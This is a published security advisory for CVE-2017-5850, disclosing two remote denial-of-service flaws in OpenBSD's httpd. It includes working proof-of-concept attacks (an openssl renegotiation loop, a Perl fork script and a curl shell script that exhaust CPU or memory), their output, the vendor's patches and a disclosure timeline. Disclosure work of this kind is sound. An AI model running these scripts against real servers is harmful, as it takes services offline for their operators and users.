@@ -1,0 +1,362 @@
+## Advisory Information
+
+Title: Remote DoS against OpenBSD http server (up to 6.0)
+Advisory URL: https://pierrekim.github.io/advisories/CVE-2017-5850-openbsd.txt
+Blog URL: https://pierrekim.github.io/blog/2017-02-07-openbsd-httpd-CVE-2017-5850.html
+Date published: 2017-02-07
+Vendors contacted: OpenBSD
+Release mode: Released
+CVE: CVE-2017-5850
+
+
+
+## Product Description
+
+The OpenBSD project produces a FREE, multi-platform 4.4BSD-based UNIX-like operating system.
+
+
+
+## Vulnerabilities Summary
+
+The shipped HTTP daemon in OpenBSD (up to the latest version) is prone to 2 remote DoS.
+
+The first vulnerability allows an attacker to consume all the CPU power from the remote server (CPU exhaustion).
+
+The second vulnerability (Memory exhaustion) allows an attacker to consume all the RAM and the swap space on the remote side.
+Processes will be killed when running out of swap space. The system will be likely to freeze.
+
+
+
+## Details - CPU exhaustion (no CVE entry)
+
+OpenBSD's httpd is prone to a SSL DoS with SSL renegotiation:
+
+user@kali:~$ (sleep 1; while true;do echo R;done) | openssl s_client -connect 10.0.2.15:443
+CONNECTED(00000003)
+depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
+verify return:1
+- ---
+Certificate chain
+ 0 s:/C=XX/ST=secure.example.com/CN=secure.example.com
+   i:/C=XX/ST=secure.example.com/CN=secure.example.com
+- ---
+Server certificate
+- -----BEGIN CERTIFICATE-----
+MIIDCjCCAfICCQC0tQxJqUqQTzANBgkqhkiG9w0BAQsFADBHMQswCQYDVQQGEwJY
+WDEbMBkGA1UECAwSc2VjdXJlLmV4YW1wbGUuY29tMRswGQYDVQQDDBJzZWN1cmUu
+ZXhhbXBsZS5jb20wHhcNMTcwMTI3MTU0MjMzWhcNMTgwMTI3MTU0MjMzWjBHMQsw
+CQYDVQQGEwJYWDEbMBkGA1UECAwSc2VjdXJlLmV4YW1wbGUuY29tMRswGQYDVQQD
+DBJzZWN1cmUuZXhhbXBsZS5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
+AoIBAQCjIY7mMaNVLmPDA4ir59mgdQEM4TFTgz5cv9SqU4hQq0eVmpJkEfJPHErF
+to5NdF2ZIqhL+F34GqZcCC8qO3xB33dAevENWWbA4KObpIybHr8bFeDYYl5GuaCO
+hizmcffU3P1ztRNXB4sCTTQwkyry8ZUDaeINLGMb0HhFR9u5TJY6tSB0KMIuiBsH
+1hEp8bNxUM046D0wkZkyIgM/or6uj5jRj33aYUn6ZiU8a6UKSAVZJLqziyNcQ0hA
+64gS6oapUnMVYJIUDJynOhY5e8xZmD+2pB4NLTIxAEdSyQ4wQ4jBiRFVL+E68fuw
+kASmrA4gAbSCO+lYBO8wCRiVOwOdAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAC1L
+213ziHqFmC8nLWvvjyoHY2PRFS1ofrfciv+fpohn2GN+eVb8DGTo+KLZ910/PUPk
+dzTa7eOlkvR1OG7BUlnia6pGQqizTodvzx0DGgl76k4VpEvJAOZ4f7Plry4qgr5Y
+y3Fwym1k3DlNJ5Jqh8Vp2HETbqcovATsUHRS5t/oc6N2egq1DYVC5CdGRgvmmUl+
+NBjKOASYoP8S4OQ51wMmXrygFqKcEkq4/GTUFEaamrbM/J+ChD9EqejSKzZ5owRh
+74v10s30OylBdmfOLeyrMv5s6DnJRAdtFEH9Wg7sQDt1P3bGOsObVZlmHCtArl4k
+m1nHRn8scAFP7QbHl34=
+- -----END CERTIFICATE-----
+subject=/C=XX/ST=secure.example.com/CN=secure.example.com
+issuer=/C=XX/ST=secure.example.com/CN=secure.example.com
+- ---
+No client certificate CA names sent
+- ---
+SSL handshake has read 1548 bytes and written 503 bytes
+- ---
+New, TLSv1/SSLv3, Cipher is ECDHE-RSA-AES256-GCM-SHA384
+Server public key is 2048 bit
+Secure Renegotiation IS supported
+Compression: NONE
+Expansion: NONE
+SSL-Session:
+    Protocol  : TLSv1.2
+    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
+    Session-ID: DA628A16EF4F067ED81E7A26EFA18D9A7D53CBC4ED54C8F6DC11E5E60FF76530
+    Session-ID-ctx: 
+    Master-Key: 9235AFEBCF2A517E896A06CAA7A1AF916646DB5BB4C99B53A79627351C0FFB936EB863B0E50A67DF70A354773CF049BE
+    Key-Arg   : None
+    PSK identity: None
+    PSK identity hint: None
+    SRP username: None
+    TLS session ticket lifetime hint: 300 (seconds)
+    TLS session ticket:
+    0000 - 49 f1 29 da 9e 08 f2 74-c6 f3 eb a1 c7 ee 40 bb   I.)....t......@.
+    0010 - 96 75 54 c8 4f 32 53 7e-51 40 4e a8 e9 57 41 a5   .uT.O2S~Q@N..WA.
+    0020 - 73 3d a9 d6 b8 f7 a0 f8-15 cb be fb f1 4d d9 81   s=...........M..
+    0030 - a8 79 56 11 5d 05 32 05-49 df 2b f3 71 89 36 a1   .yV.].2.I.+.q.6.
+    0040 - 93 dc b9 b5 00 48 6f 94-b1 c5 78 f8 38 3c 63 29   .....Ho...x.8<c)
+    0050 - ed 45 a2 9e ae fc 7e d7-12 76 34 15 93 b1 3d 3d   .E....~..v4...==
+    0060 - d7 0a 14 f1 01 a7 87 6c-50 93 25 24 5e 4f 1b fa   .......lP.%$^O..
+    0070 - 51 03 4b fa 7e 23 83 99-51 f6 47 10 8c d1 0e 41   Q.K.~#..Q.G....A
+    0080 - 5a f7 a5 10 33 a7 37 5d-9b 5e b0 b6 19 e7 e2 61   Z...3.7].^.....a
+    0090 - ec ea 1c 72 3c 4a ec 11-0f 26 35 76 6e d9 cb 4d   ...r<J...&5vn..M
+    00a0 - c7 f8 57 cb 50 f6 47 02-6b ca be cc 29 04 b7 dc   ..W.P.G.k...)...
+    00b0 - e0 d1 cc 8e 5b f9 05 06-10 72 d7 b6 8e cf 42 6a   ....[....r....Bj
+
+    Start Time: 1485536662
+    Timeout   : 300 (sec)
+    Verify return code: 18 (self signed certificate)
+- ---
+RENEGOTIATING
+depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
+verify return:1
+RENEGOTIATING
+depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
+verify return:1
+RENEGOTIATING
+depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
+verify return:1
+RENEGOTIATING
+[...]
+
+
+
+- From my test, 1 renegociation thread takes =~ 70% of CPU.
+
+top on the main server (10.0.2.15):
+
+14711 www       51    0 1104K 3636K run       -         1:07 69.55% httpd
+
+Multiple threads will eat all the available CPUs and will be likely to DoS the httpd:
+
+14711 www       63    0 1192K 3708K run       -         2:48 33.45% httpd
+77207 www       63    0 1284K 3788K run       -         1:33 33.06% httpd
+78835 www       62    0 1232K 3808K run       -         0:15 28.08% httpd
+
+There is no trace of such attacks in the httpd logs.
+
+An attacker can use tools from THC to perform SSL DoS too (openssl was the fastest solution out of the box): https://www.thc.org/thc-ssl-dos/.
+
+
+
+## Details - Memory exhaustion (CVE-2017-5850)
+
+A vulnerability exists in the openbsd HTTP daemon. It will result in using all the RAM and the swap space on the remote side, processes will be killed when running out of swap space. The system will be likely to freeze.
+
+Requesting file using a file-range will result in having a httpd process doing a full malloc() of the requested file.
+It appears the entry is not correctly free()'d.
+
+Hence, it's possible to DoS the remote server by requesting a file over and over by specifying a custom file range, ie:
+
+    GET /index.html HTTP/1.1
+    Range: bytes=1-
+    User-Agent: Pierre loves you
+    Host: fill-me-with-joy
+
+This attack is successful if an attacker can identify a 'big' file (i.e. > 10MB) served by the remote HTTP server.
+
+Here is a provided PoC (loosely based on KingCope's apache_killer.pl):
+
+#!/usr/bin/perl -w
+
+use warnings;
+use IO::Socket;
+use Parallel::ForkManager;
+
+$numforks = 50;
+
+if ($#ARGV < 1)
+{
+  &usage;
+  exit;
+}
+
+while (1) {
+  &killhttpd();
+}
+
+sub usage {
+  print "OpenBSD HTTP Remote Denial of Service (memory exhaustion) - @PierreKimSec\n";
+  print "usage: perl killobsdhttpd.pl <host> <remotefile>\n";
+}
+
+sub killhttpd {
+  print "ATTACKING $ARGV[0] [using $numforks forks]\n";
+
+  $pm = new Parallel::ForkManager($numforks);
+
+  for (0 .. $numforks)
+  {
+    my $pid = $pm->start and next;
+    my $sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
+                                     PeerPort => "80",
+                                     Proto    => 'tcp');
+    $p = "GET $ARGV[1] HTTP/1.1\r\nRange: bytes=1-\r\nAccept: */*\r\nHost: $ARGV[0]\r\nConnection: close\r\n\r\n";
+    print $sock $p;
+    if (<$sock>) {sleep (0.5); $sock->close();}
+    $pm->finish;
+  }
+  $pm->wait_all_children;
+}
+
+
+An attacker can use curl to replicate the PoC:
+
+    curl --limit-rate 1 --continue-at 1 --header "Host: www.example.com" http://target/10mb.fs
+
+Stopping the curl process and launching it again will produce one of the remote httpd to use more than 10MB of memory
+for each request (the size of the 10mb.fs is 10MB) and will DoS the http server and the OpenBSD system by exhausting
+all the RAM. The OpenBSD system will likely freeze within minutes.
+
+
+PoC with curl (more effective than the perl version, it appears):
+
+#!/bin/sh
+# ./$0 www.target.tld /path/to/file
+
+unset http_proxy
+unset https_proxy
+
+for i in $(seq 0 300)
+do
+  echo sending a req
+  curl --limit-rate 1 --continue-at 1 --header "Host: $1" http://$1/$2 2>/dev/null >/dev/null &
+  sleep 0.5
+  pkill curl
+done
+while sleep 1
+do
+  echo "sending a req (slow)"
+  curl --limit-rate 1 --continue-at 1 --header "Host: $1" http://$1/$2 2>/dev/null >/dev/null &
+  pkill curl
+done
+
+This attack works using HTTP and using HTTPS.
+
+Current situation in the attacked server (SWAP is full and all the RAM is being completely used):
+
+load averages:  7.11,  3.30,  1.38                                             foo.my.domain 10:26:41
+39 processes: 6 running, 32 idle, 1 on processor                                             up  0:03
+CPU states:  0.0% user,  0.0% nice,  100% system,  0.0% interrupt,  0.0% idle
+Memory: Real: 569M/961M act/tot Free: 21M Cache: 49M Swap: 2039M/2040M
+
+  PID USERNAME PRI NICE  SIZE   RES STATE     WAIT      TIME    CPU COMMAND
+  48965 www       28    0 1345M  204M run       -         0:05  0.00% httpd
+  43060 www       28    0 1281M  174M run       -         0:05  0.00% httpd
+  91565 www       28    0 1153M  187M run       -         0:04  0.00% httpd
+  63038 www        2    0  948K    4K idle      kqread    0:00  0.00% httpd
+
+
+
+We see the daemons (httpd and sshd) don't answer anymore:
+
+user@kali:~$ 10.0.2.15 80
+Trying 10.0.2.15...
+Connected to 10.0.2.15.
+Escape character is '^]'.
+
+^]
+telnet> q
+Connection closed.
+user@kali:~$ telnet 10.0.2.15 80
+Trying 10.0.2.15...
+Connected to 10.0.2.15.
+Escape character is '^]'.
+
+^]
+telnet> q
+Connection closed.
+user@kali:~$ telnet 10.0.2.15 22
+Trying 10.0.2.15...
+Connected to 10.0.2.15.
+Escape character is '^]'.
+
+^]
+telnet> q
+Connection closed.
+Connection closed by foreign host.
+
+
+
+## Vendor Response
+
+o The issue about memory exhaustion has been solved in two ways:
+- - OpenBSD 6.0/5.9: Erratas has been issued at:
+https://ftp.openbsd.org/pub/OpenBSD/patches/6.0/common/017_httpd.patch.sig
+https://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/034_httpd.patch.sig
+
+- - OpenBSD -current: We reimplemented support for byte ranges in
+- -current.  The previous implementation was flawed indeed, as it tried
+to load the complete ranges into memory at once.
+
+
+o High CPU usage is a well-known issue of client-initiated
+renegotiation.  While this can cause higher than normal CPU usage, the
+processes are still able to service requests.
+
+As httpd uses LibreSSL's libtls, a sane TLS API on top of libssl, we
+decided to disable client-initiated renegotiation for libtls servers
+in -current.  This change was already planned and has now been
+committed to LibreSSL.
+
+libssl http://marc.info/?l=openbsd-cvs&m=148587695222112&w=2
+libtls http://marc.info/?l=openbsd-cvs&m=148587827322528&w=2
+
+
+
+## Report Timeline
+
+* Jan 25, 2017: Vulnerabilities found by Pierre Kim.
+* Jan 30, 2017: OpenBSD team is notified of the vulnerabilities.
+* Jan 30, 2017: OpenBSD team replies that they will study the advisory.
+* Jan 31, 2017: OpenBSD team confirms the vulnerabilities.
+* Jan 31, 2017: Pierre Kim asks for CVE entries.
+* Jan 31, 2017: OpenBSD team releases security patches.
+* Feb 01, 2017: cve-assign () mitre org assigns CVE-2017-5850 and asks for more details.
+* Feb 07, 2017: A public advisory is sent to security mailing lists.
+
+
+
+## Credit
+
+These vulnerabilities were found by Pierre Kim (@PierreKimSec).
+
+
+
+## References
+
+https://pierrekim.github.io/blog/2017-02-07-openbsd-httpd-CVE-2017-5850.html
+https://pierrekim.github.io/advisories/CVE-2017-5850-openbsd.txt
+https://ftp.openbsd.org/pub/OpenBSD/patches/6.0/common/017_httpd.patch.sig
+https://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/034_httpd.patch.sig
+
+
+
+## Disclaimer
+
+This advisory is licensed under a Creative Commons Attribution Non-Commercial
+Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBCgAGBQJYmMPLAAoJEMQ+Dtp9ky28SpUP/AvB7lMxjIlmMQi7XJFMgxTX
+0h3WixpI4tunSKyqC9BflMQRyFQgQ5AX8oh0s2OPJbeVc4RsHf2FBMru6NsvIoyR
+Tn537GqqYZ19FpQZOYxEtGVd4SbK+LagtY9xkn4c/Tzd+moDv56e3QKl7AtdLETq
+P/GM+n5I/aN0sSYPDBR8XxYS9HrDPFjPADB3qgM4Jef+TBpTnP/yL2SFwPgGosrq
+05Exo00tK6YXr3zHFAJb/a4Q2L8/nHgZIpLi2iTkISGcOEzWVT3gFeiCdC0cYLHM
+iqCet2eDqEG6UhpP0eQQrFqM30WQ+8z1nDBj4wxX07Np0ZTWkYRw+ezXDYFHIMLE
+uCkVJRRm2zZOTfq8qxTldhE1wyNtd+cEBScT9+7+Xz5NN9Fq3zg47XC8AWQkH7tD
+IAcIF+4aO7NAWT9Y5Q+UR0r9aTXn8fGorj9/I5d7g5fWTUKujQjnscuZQ/4e0+1B
+yb2KAO3Al8s4LQnbqXU/qJ5y/tm+Ra7kxRdogRHpkDR8TwCTwHtTMz+mxGtbIL3X
+C0plD5sde6MlYCnkd8WKEBb0bBYyR3leaew6s0dx7iz+smQWe9wXufvMLjQgkP6/
+6xfRPyQWOxc4KCWiB5kalQ2soOFVeHbHWimG3/+39qNOb8dY7XA1+0wmYKtdDKvR
+3x5MojAce/XvKlx7Cy02
+=MAFw
+-----END PGP SIGNATURE-----
